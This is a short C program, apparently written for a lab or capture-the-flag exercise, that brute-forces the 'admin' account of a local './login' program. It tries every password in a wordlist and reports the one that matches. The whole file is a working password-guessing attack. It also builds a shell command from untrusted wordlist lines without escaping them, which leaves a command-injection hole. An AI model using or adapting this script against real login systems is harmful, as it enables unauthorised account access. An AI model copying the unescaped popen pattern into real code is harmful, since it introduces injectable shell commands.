#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *wordlist = fopen("wordlist.txt", "r");
    if (!wordlist) {
        perror("Failed to open wordlist");
        return 1;
    }

    char password[100];
    char user[] = "admin";

    while (fgets(password, sizeof(password), wordlist)) {
        // Remove newline character
        password[strcspn(password, "\n")] = 0;

        char command[200];
        snprintf(command, sizeof(command), "echo \"%s\n%s\" | ./login", user, password);

        FILE *fp = popen(command, "r");
        if (!fp) {
            perror("popen failed");
            continue;
        }

        char output[100];
        while (fgets(output, sizeof(output), fp)) {
            if (strstr(output,"Login successful!\n")) {
                printf("[+] Password found: %s\n", password);
                fclose(wordlist);
                pclose(fp);
                return 0;
            }
        }

        pclose(fp);
    }

    fclose(wordlist);
    printf("[-] Password not found in wordlist.\n");
    return 1;
}
